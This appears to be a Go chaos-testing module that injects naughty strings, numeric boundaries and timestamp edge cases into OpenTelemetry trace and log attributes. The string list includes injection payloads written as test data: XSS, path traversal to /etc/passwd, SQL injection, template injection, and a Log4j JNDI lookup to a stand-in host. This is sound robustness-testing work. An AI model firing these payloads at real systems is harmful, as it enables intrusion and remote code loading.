package aggro

import (
	_ "embed"
	"math"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/antithesishq/antithesis-sdk-go/random"
	"github.com/spf13/viper"
	"go.opentelemetry.io/otel/attribute"
	otellog "go.opentelemetry.io/otel/log"
)

type AggroConfig struct {
	TimestampTarget string // "" = random, "attr_name" = specific
	NumericTarget   string // "" = random, "attr_name" = specific
	StringTarget    string // "" = random, "attr_name" = specific
	TimestampActive bool
	NumericActive   bool
	StringActive    bool
}

func ParseAggroConfig(component string) *AggroConfig {
	config := &AggroConfig{}

	timestampFlag := viper.GetString("generate." + component + ".aggro_timestamp")
	numericFlag := viper.GetString("generate." + component + ".aggro_numeric")
	stringFlag := viper.GetString("generate." + component + ".aggro_string")

	// IsSet detects flag presence regardless of value
	config.TimestampActive = viper.IsSet("generate." + component + ".aggro_timestamp")
	config.NumericActive = viper.IsSet("generate." + component + ".aggro_numeric")
	config.StringActive = viper.IsSet("generate." + component + ".aggro_string")

	config.TimestampTarget = timestampFlag
	config.NumericTarget = numericFlag
	config.StringTarget = stringFlag

	return config
}

func (config *AggroConfig) HasAnyActive() bool {
	return config.TimestampActive || config.NumericActive || config.StringActive
}

// private helper
func (config *AggroConfig) ApplyAggroToTraceAttributes(attrs []attribute.KeyValue, skipKeys []string, protocol string) ([]attribute.KeyValue, []attribute.KeyValue) {
	if !config.HasAnyActive() {
		return attrs, nil
	}

	modifiedAttrs := make([]attribute.KeyValue, len(attrs))
	copy(modifiedAttrs, attrs)

	var metadataAttrs []attribute.KeyValue

	// Apply string aggro
	if config.StringActive {
		stringValues := GetAggroStrings()

		// Apply gRPC sanitization if using gRPC protocol
		if protocol == "grpc" {
			sanitizedValues := make([]string, len(stringValues))
			for i, s := range stringValues {
				sanitizedValues[i] = sanitizeForGRPC(s)
			}
			stringValues = sanitizedValues
		}

		if len(stringValues) > 0 {
			targetKey, modified := config.applyAggroToTraceAttributes(modifiedAttrs, stringValues, config.StringTarget, skipKeys)
			if modified {
				metadataAttrs = append(metadataAttrs, attribute.String("aggro.string", targetKey))
			}
		}
	}

	// Apply numeric aggro
	if config.NumericActive {
		numericValues := GetAggroNumerics()
		if len(numericValues) > 0 {
			targetKey, modified := config.applyAggroToTraceAttributes(modifiedAttrs, numericValues, config.NumericTarget, skipKeys)
			if modified {
				metadataAttrs = append(metadataAttrs, attribute.String("aggro.numeric", targetKey))
			}
		}
	}

	// Apply timestamp aggro
	if config.TimestampActive {
		timestamps := GetAggroTimestamps()
		var timestampValues []string
		for _, ts := range timestamps {
			// Format as RFC3339 for string attributes
			timestampValues = append(timestampValues, ts.Format(time.RFC3339))
			// Also add Unix timestamp format
			timestampValues = append(timestampValues, strconv.FormatInt(ts.Unix(), 10))
		}
		if len(timestampValues) > 0 {
			targetKey, modified := config.applyAggroToTraceAttributes(modifiedAttrs, timestampValues, config.TimestampTarget, skipKeys)
			if modified {
				metadataAttrs = append(metadataAttrs, attribute.String("aggro.timestamp", targetKey))
			}
		}
	}

	return modifiedAttrs, metadataAttrs
}

func (config *AggroConfig) applyAggroToTraceAttributes(attrs []attribute.KeyValue, aggroValues []string, target string, skipKeys []string) (string, bool) {
	// Get available attribute keys
	var availableKeys []string
	for _, attr := range attrs {
		key := string(attr.Key)
		shouldSkip := false
		for _, skipKey := range skipKeys {
			if key == skipKey {
				shouldSkip = true
				break
			}
		}
		if !shouldSkip {
			availableKeys = append(availableKeys, key)
		}
	}

	if len(availableKeys) == 0 {
		return "", false
	}

	// Choose target key
	var targetKey string
	if target != "" {
		// Specific target requested
		targetKey = target
		// Check if target exists in attributes
		found := false
		for _, key := range availableKeys {
			if key == target {
				found = true
				break
			}
		}
		if !found {
			// Target doesn't exist, skip
			return "", false
		}
	} else {
		// Random target selection
		targetKey = random.RandomChoice(availableKeys)
	}

	// Select random aggro value
	aggroValue := random.RandomChoice(aggroValues)

	// Replace the attribute value
	for i, attr := range attrs {
		if string(attr.Key) == targetKey {
			attrs[i] = attribute.String(targetKey, aggroValue)
			break
		}
	}

	return targetKey, true
}

// ApplyAggroToLogAttributes applies aggro modifications to OTEL log attributes and message
// Returns modified attributes, modified message, and metadata attributes about what was changed
// Protocol parameter determines if gRPC sanitization should be applied (use "grpc" for sanitization)
func (config *AggroConfig) ApplyAggroToLogAttributes(attrs []otellog.KeyValue, logMessage string, skipKeys []string, protocol string) ([]otellog.KeyValue, string, []otellog.KeyValue) {
	if !config.HasAnyActive() {
		return attrs, logMessage, nil
	}

	modifiedAttrs := make([]otellog.KeyValue, len(attrs))
	copy(modifiedAttrs, attrs)
	modifiedMessage := logMessage

	var metadataAttrs []otellog.KeyValue

	// Apply string aggro
	if config.StringActive {
		stringValues := GetAggroStrings()

		// Apply gRPC sanitization if using gRPC protocol
		if protocol == "grpc" {
			sanitizedValues := make([]string, len(stringValues))
			for i, s := range stringValues {
				sanitizedValues[i] = sanitizeForGRPC(s)
			}
			stringValues = sanitizedValues
		}

		if len(stringValues) > 0 {
			targetKey, modified := config.applyAggroToLogAttributes(modifiedAttrs, &modifiedMessage, stringValues, config.StringTarget, skipKeys)
			if modified {
				metadataAttrs = append(metadataAttrs, otellog.String("aggro.string", targetKey))
			}
		}
	}

	// Apply numeric aggro
	if config.NumericActive {
		numericValues := GetAggroNumerics()
		if len(numericValues) > 0 {
			targetKey, modified := config.applyAggroToLogAttributes(modifiedAttrs, &modifiedMessage, numericValues, config.NumericTarget, skipKeys)
			if modified {
				metadataAttrs = append(metadataAttrs, otellog.String("aggro.numeric", targetKey))
			}
		}
	}

	// Apply timestamp aggro
	if config.TimestampActive {
		timestamps := GetAggroTimestamps()
		var timestampValues []string
		for _, ts := range timestamps {
			// Format as RFC3339 for string attributes
			timestampValues = append(timestampValues, ts.Format(time.RFC3339))
			// Also add Unix timestamp format
			timestampValues = append(timestampValues, strconv.FormatInt(ts.Unix(), 10))
		}
		if len(timestampValues) > 0 {
			targetKey, modified := config.applyAggroToLogAttributes(modifiedAttrs, &modifiedMessage, timestampValues, config.TimestampTarget, skipKeys)
			if modified {
				metadataAttrs = append(metadataAttrs, otellog.String("aggro.timestamp", targetKey))
			}
		}
	}

	return modifiedAttrs, modifiedMessage, metadataAttrs
}

// applyAggroToLogAttributes applies aggro values to log attributes or message
func (config *AggroConfig) applyAggroToLogAttributes(attrs []otellog.KeyValue, logMessage *string, aggroValues []string, target string, skipKeys []string) (string, bool) {
	// Get available attribute keys plus "message" option
	var availableKeys []string
	availableKeys = append(availableKeys, "message") // Log message can be targeted
	for _, attr := range attrs {
		key := attr.Key
		shouldSkip := false
		for _, skipKey := range skipKeys {
			if key == skipKey {
				shouldSkip = true
				break
			}
		}
		if !shouldSkip {
			availableKeys = append(availableKeys, key)
		}
	}

	if len(availableKeys) == 0 {
		return "", false
	}

	// Choose target key
	var targetKey string
	if target != "" {
		// Specific target requested
		targetKey = target
		// Check if target exists in available keys
		found := false
		for _, key := range availableKeys {
			if key == target {
				found = true
				break
			}
		}
		if !found {
			// Target doesn't exist, skip
			return "", false
		}
	} else {
		// Random target selection
		targetKey = random.RandomChoice(availableKeys)
	}

	// Select random aggro value
	aggroValue := random.RandomChoice(aggroValues)

	// Apply the aggro value
	if targetKey == "message" {
		*logMessage = aggroValue
	} else {
		// Replace the attribute value
		for i, attr := range attrs {
			if attr.Key == targetKey {
				attrs[i] = otellog.String(targetKey, aggroValue)
				break
			}
		}
	}

	return targetKey, true
}

// ====== BLNS =======
//
//go:embed blns.txt
var naughtyStrings string

// GetAggroStrings returns naughty strings for chaos testing string attributes
func GetAggroStrings() []string {
	var values []string

	// Add naughty strings from embedded file (blns.txt)
	lines := strings.Split(naughtyStrings, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			values = append(values, line)
		}
	}

	// LLM-supplied additional advanced unicode and encoding edge cases
	advancedStringChaos := []string{
		// Zero-width characters (invisible)
		"\u200B", // Zero-width space
		"\u200C", // Zero-width non-joiner
		"\u200D", // Zero-width joiner
		"\u200E", // Left-to-right mark
		"\u200F", // Right-to-left mark
		"\uFEFF", // Zero-width no-break space (BOM)

		// Bidirectional text (can cause display issues)
		"Hello\u202Eworld",        // Right-to-left override
		"test\u202Dreverse\u202C", // Right-to-left embedding
		"\u061Cاختبار\u061C",      // Arabic letter mark around Arabic

		// Emoji sequences and variations
		"👩‍💻",     // Woman technologist (composite emoji)
		"🧑‍🤝‍🧑",   // People holding hands (composite)
		"👨‍👩‍👧‍👦", // Family (composite)
		"🏴‍☠️",    // Pirate flag (composite)
		"🌈",       // Rainbow
		"💯",       // Hundred points symbol
		"🚀",       // Rocket
		"🔥",       // Fire
		"✅",       // Check mark
		"❌",       // Cross mark
		"🎭🎨🎪🎯",    // Multiple emojis
		"🙈🙉🙊",     // See no evil monkeys
		"🇺🇸",      // US flag (regional indicator symbols)
		"🇬🇧",      // GB flag
		"🇯🇵",      // Japan flag

		// Combining characters and diacriticals
		"a\u0301",       // a with acute accent (combining)
		"e\u0300\u0301", // e with grave and acute (multiple combining)
		"o\u0308",       // o with diaeresis
		"n\u0303",       // n with tilde
		"u\u030C",       // u with caron
		"Z̴̗̺̠͇̪̈̌͌̋̔̊̚a̵̗͎̠̤̟̿͐̑̇l̷̰̈ǵ̶̰̳͖o̷̤̥̜͑́", // Zalgo text

		// Surrogate pairs (UTF-16 edge cases)
		"𝕳𝖊𝖑𝖑𝖔", // Mathematical bold fraktur
		"𝓗𝓮𝓵𝓵𝓸", // Mathematical script
		"𝔥𝔢𝔩𝔩𝔬", // Mathematical fraktur
		"ℌ𝒆𝓁𝓁𝑜", // Mixed mathematical styles

		// Control characters (can break parsing)
		"\x00", // Null byte
		"\x01", // Start of heading
		"\x02", // Start of text
		"\x03", // End of text
		"\x04", // End of transmission
		"\x05", // Enquiry
		"\x06", // Acknowledge
		"\x07", // Bell
		"\x08", // Backspace
		"\x0B", // Vertical tab
		"\x0C", // Form feed
		"\x0E", // Shift out
		"\x0F", // Shift in
		"\x1B", // Escape
		"\x7F", // Delete

		// Non-printable Unicode characters
		"\u0080", // Padding character
		"\u0081", // High octet preset
		"\u009F", // Application program command
		"\u00A0", // Non-breaking space
		"\u00AD", // Soft hyphen
		"\u034F", // Combining grapheme joiner
		"\u115F", // Hangul choseong filler
		"\u1160", // Hangul jungseong filler
		"\u17B4", // Khmer vowel inherent Aq
		"\u17B5", // Khmer vowel inherent Aa
		"\u180E", // Mongolian vowel separator

		// Normalization edge cases (different Unicode forms)
		"café",        // NFC: é as single character
		"cafe\u0301",  // NFD: e + combining acute
		"Åpfel",       // NFC: Å as single character
		"A\u030Apfel", // NFD: A + combining ring above

		// Different script systems
		"Здравствуй", // Cyrillic
		"こんにちは",      // Hiragana
		"你好",         // Chinese
		"مرحبا",      // Arabic
		"שלום",       // Hebrew
		"नमस्ते",     // Devanagari
		"안녕하세요",      // Hangul
		"สวัสดี",     // Thai
		"Χαίρετε",    // Greek

		// Punycode/IDN edge cases
		"xn--nxasmq6b",          // Punycode for 好例子
		"xn--e1afmkfd.xn--p1ai", // пример.рф in Punycode

		// Long strings (can cause buffer overflows)
		strings.Repeat("A", 1000),
		strings.Repeat("💯", 100), // Long emoji string
		strings.Repeat("🚀", 50),  // Medium emoji string

		// Mixed content edge cases
		"Hello\nWorld\r\n",              // Mixed line endings
		"Tab\there\ttab",                // Tabs
		"Quote'this\"quote",             // Mixed quotes
		"Slash\\and/slash",              // Mixed slashes
		"<script>alert('xss')</script>", // HTML/JS injection attempt
		"../../etc/passwd",              // Path traversal attempt
		"' OR '1'='1",                   // SQL injection attempt
		"${jndi:ldap://evil.com/}",      // Log4j injection attempt
		"{{7*7}}",                       // Template injection attempt

		// Encoding confusion
		"caf\xE9",      // Latin-1 é
		"caf\xC3\xA9",  // UTF-8 é
		"\xFF\xFE",     // UTF-16 LE BOM
		"\xFE\xFF",     // UTF-16 BE BOM
		"\xEF\xBB\xBF", // UTF-8 BOM
	}

	values = append(values, advancedStringChaos...)

	return values
}

// GetAggroNumerics returns numeric aggro values for chaos testing numeric attributes
func GetAggroNumerics() []string {
	var values []string

	// LLM assisted comprehensive numeric aggro values for chaos engineering
	numericBoundaries := []interface{}{
		// Integer boundaries
		math.MaxInt64,
		math.MinInt64,
		math.MaxInt32,
		math.MinInt32,
		int16(math.MaxInt16),
		int16(math.MinInt16),
		int8(math.MaxInt8),
		int8(math.MinInt8),
		uint64(18446744073709551615), // MaxUint64
		uint32(4294967295),           // MaxUint32
		uint16(65535),                // MaxUint16
		uint8(255),                   // MaxUint8

		// Float boundaries
		math.MaxFloat64,
		-math.MaxFloat64,
		math.MaxFloat32,
		-math.MaxFloat32,
		math.SmallestNonzeroFloat64,
		math.SmallestNonzeroFloat32,

		// Special float values
		math.Inf(1),  // +Inf
		math.Inf(-1), // -Inf
		math.NaN(),   // NaN

		// Zero variations
		0,
		-0,
		0.0,

		// Basic values
		1,
		-1,
		1.0,
		-1.0,

		// Float precision edge cases
		0.1, // Classic floating point precision issue
		0.2,
		0.3,
		1.0 / 3.0, // Repeating decimal
		2.0 / 3.0,
		math.Pi,      // Irrational number
		math.E,       // Euler's number
		math.Sqrt(2), // Square root of 2
		math.Ln2,     // Natural log of 2
		math.Log10E,  // Log base 10 of E

		// Very small numbers (subnormal/denormal)
		1e-308,
		1e-323,   // Near underflow
		4.9e-324, // Smallest positive denormal double

		// Very large numbers
		1e308,
		1.7e308, // Near overflow

		// Powers of 2 (binary edge cases)
		1024,
		2048,
		4096,
		8192,
		65536,      // 2^16
		1048576,    // 2^20
		16777216,   // 2^24
		4294967296, // 2^32

		// Powers of 10 (decimal edge cases)
		1e10,
		1e15,
		1e20,

		// Common problematic values
		1.23456789012345,  // Long precision
		999999999999999,   // Large integer near JS safe limit
		9007199254740992,  // 2^53, JavaScript safe integer limit
		-9007199254740992, // -2^53

		// Financial/decimal precision edge cases
		0.01,  // Cents
		0.001, // Thousandths
		99.99, // Common price
		999.99,
		1000.01, // Just over thousand

		// Scientific notation values (will be formatted as such)
		1.23e-4,
		5.67e8,
		-9.87e-12,
		4.56e15,
	}

	for _, val := range numericBoundaries {
		values = append(values, formatValue(val))
	}

	// Add string representations of scientific notation
	scientificNotations := []string{
		"1.23E-4",
		"5.67E+8",
		"-9.87E-12",
		"4.56E+15",
		"1e10",
		"2E-5",
		"NaN",
		"+Inf",
		"-Inf",
		"Infinity",
		"-Infinity",
	}
	values = append(values, scientificNotations...)

	return values
}

// GetAggroTimestamps returns timestamp edge cases for chaos testing timestamp attributes
func GetAggroTimestamps() []time.Time {
	now := time.Now()

	// Load common timezones for edge case testing
	utc := time.UTC
	est, _ := time.LoadLocation("America/New_York")
	pst, _ := time.LoadLocation("America/Los_Angeles")
	jst, _ := time.LoadLocation("Asia/Tokyo")

	timestamps := []time.Time{
		// Basic edge cases
		time.Unix(0, 0),                        // Unix epoch
		time.Unix(-1, 0),                       // Before epoch
		time.Unix(1, 0),                        // Just after epoch
		time.Unix(2147483647, 0),               // 32-bit signed int max (2038-01-19)
		time.Unix(-2147483648, 0),              // 32-bit signed int min (1901-12-13)
		time.Unix(4294967295, 0),               // 32-bit unsigned int max (2106-02-07)
		time.Unix(253402300799, 0),             // Year 9999-12-31
		time.Date(1970, 1, 1, 0, 0, 0, 0, utc), // Explicit epoch UTC
		time.Date(2000, 1, 1, 0, 0, 0, 0, utc), // Y2K
		time.Date(1900, 1, 1, 0, 0, 0, 0, utc), // Early 1900s
		time.Time{},                            // Zero time

		// Leap year edge cases
		time.Date(2000, 2, 29, 0, 0, 0, 0, utc),    // Leap day 2000 (divisible by 400)
		time.Date(1900, 2, 28, 23, 59, 59, 0, utc), // Feb 28, 1900 (not a leap year)
		time.Date(2024, 2, 29, 12, 0, 0, 0, utc),   // Recent leap day
		time.Date(2100, 2, 28, 23, 59, 59, 0, utc), // Feb 28, 2100 (not a leap year)
		time.Date(2000, 3, 1, 0, 0, 0, 0, utc),     // Day after leap day

		// DST transition edge cases (US Eastern Time)
		time.Date(2024, 3, 10, 6, 59, 59, 0, utc), // Just before spring DST (2 AM becomes 3 AM)
		time.Date(2024, 3, 10, 7, 0, 0, 0, utc),   // During spring DST gap
		time.Date(2024, 11, 3, 5, 59, 59, 0, utc), // Just before fall DST (2 AM becomes 1 AM)
		time.Date(2024, 11, 3, 6, 30, 0, 0, utc),  // During fall DST overlap

		// Timezone edge cases
		time.Date(2024, 1, 1, 0, 0, 0, 0, est), // New Year in EST
		time.Date(2024, 1, 1, 0, 0, 0, 0, pst), // New Year in PST (3 hours later)
		time.Date(2024, 1, 1, 0, 0, 0, 0, jst), // New Year in JST (different day)

		// Month boundary edge cases
		time.Date(2024, 1, 31, 23, 59, 59, 999999999, utc),  // End of January
		time.Date(2024, 2, 1, 0, 0, 0, 0, utc),              // Start of February
		time.Date(2024, 12, 31, 23, 59, 59, 999999999, utc), // End of year

		// Week boundary edge cases
		time.Date(2024, 1, 6, 23, 59, 59, 0, utc), // Saturday
		time.Date(2024, 1, 7, 0, 0, 0, 0, utc),    // Sunday
		time.Date(2024, 1, 8, 0, 0, 0, 0, utc),    // Monday

		// Nanosecond precision edge cases
		time.Date(2024, 1, 1, 0, 0, 0, 999999999, utc), // Max nanoseconds
		time.Date(2024, 1, 1, 0, 0, 0, 1, utc),         // Min nanoseconds

		// Relative to now
		now.Add(100 * 365 * 24 * time.Hour),  // Far future (~100 years)
		now.Add(-100 * 365 * 24 * time.Hour), // Far past (~100 years ago)
		now.Add(time.Nanosecond),             // Just after now
		now.Add(-time.Nanosecond),            // Just before now
		now.Truncate(24 * time.Hour),         // Today at midnight
		now.Truncate(time.Hour),              // This hour
		now.Truncate(time.Minute),            // This minute
		now.Truncate(time.Second),            // This second
	}

	return timestamps
}

// GetAggroValues returns all aggro condition values (for backward compatibility)
// TODO: Deprecated - use specific GetAggro* functions instead
func GetAggroValues() []string {
	var values []string

	// Combine all aggro values for backward compatibility
	values = append(values, GetAggroStrings()...)
	values = append(values, GetAggroNumerics()...)
	// Add timestamp values inline
	timestamps := GetAggroTimestamps()
	for _, ts := range timestamps {
		// Format as RFC3339 for string attributes
		values = append(values, ts.Format(time.RFC3339))
		// Also add Unix timestamp format
		values = append(values, strconv.FormatInt(ts.Unix(), 10))
	}

	return values
}

// GetAggroValuesForProtocol returns all aggro condition values with protocol-specific sanitization
func GetAggroValuesForProtocol(protocol string) []string {
	var values []string

	// Get string values and apply sanitization if needed
	stringValues := GetAggroStrings()
	if protocol == "grpc" {
		sanitizedStrings := make([]string, len(stringValues))
		for i, s := range stringValues {
			sanitizedStrings[i] = sanitizeForGRPC(s)
		}
		stringValues = sanitizedStrings
	}

	// Combine all aggro values
	values = append(values, stringValues...)
	values = append(values, GetAggroNumerics()...)
	// Add timestamp values inline
	timestamps := GetAggroTimestamps()
	for _, ts := range timestamps {
		// Format as RFC3339 for string attributes
		values = append(values, ts.Format(time.RFC3339))
		// Also add Unix timestamp format
		values = append(values, strconv.FormatInt(ts.Unix(), 10))
	}

	return values
}

func formatValue(val interface{}) string {
	switch v := val.(type) {
	case int64:
		return strconv.FormatInt(v, 10)
	case float64:
		if math.IsInf(v, 0) {
			if math.IsInf(v, 1) {
				return "+Inf"
			}
			return "-Inf"
		}
		if math.IsNaN(v) {
			return "NaN"
		}
		return strconv.FormatFloat(v, 'g', -1, 64)
	case int:
		return strconv.Itoa(v)
	case int32:
		return strconv.FormatInt(int64(v), 10)
	case float32:
		return strconv.FormatFloat(float64(v), 'g', -1, 32)
	default:
		return ""
	}
}

// sanitizeForGRPC removes control characters and invalid UTF-8 sequences that cause gRPC marshaling errors
// This is only applied when using gRPC protocol - HTTP exports remain unfiltered for maximum chaos testing
func sanitizeForGRPC(s string) string {
	// Quick check if string is already valid UTF-8 without problematic control chars
	if isValidUTF8ForGRPC(s) {
		return s
	}

	// Convert to runes to handle UTF-8 properly, then filter
	runes := []rune{}
	for _, r := range s {
		// Keep valid Unicode characters, excluding problematic control chars
		if isValidRuneForGRPC(r) {
			runes = append(runes, r)
		}
	}

	return string(runes)
}

// isValidUTF8ForGRPC checks if a string is valid UTF-8 without gRPC-problematic control characters
func isValidUTF8ForGRPC(s string) bool {
	if !utf8.ValidString(s) {
		return false
	}

	// Check for problematic control characters
	for _, b := range []byte(s) {
		if isProblematicControlChar(b) {
			return false
		}
	}

	return true
}

// isValidRuneForGRPC determines if a Unicode rune is safe for gRPC transmission
func isValidRuneForGRPC(r rune) bool {
	// Exclude problematic control characters but keep printable Unicode
	if r < 32 {
		// Keep tab (9), newline (10), carriage return (13) as they're commonly needed
		return r == 9 || r == 10 || r == 13
	}

	// Exclude DEL character
	if r == 127 {
		return false
	}

	// Keep all other valid Unicode characters (including emojis, combining chars, etc.)
	return r != utf8.RuneError
}

// isProblematicControlChar checks if a byte represents a control character that breaks gRPC
func isProblematicControlChar(b byte) bool {
	// NULL byte (0x00)
	if b == 0 {
		return true
	}

	// Control characters 0x01-0x08, 0x0B-0x0C, 0x0E-0x1F (excluding \t, \n, \r)
	if b >= 1 && b <= 8 {
		return true
	}
	if b == 11 || b == 12 { // VT, FF
		return true
	}
	if b >= 14 && b <= 31 {
		return true
	}

	// DEL character (0x7F)
	if b == 127 {
		return true
	}

	return false
}
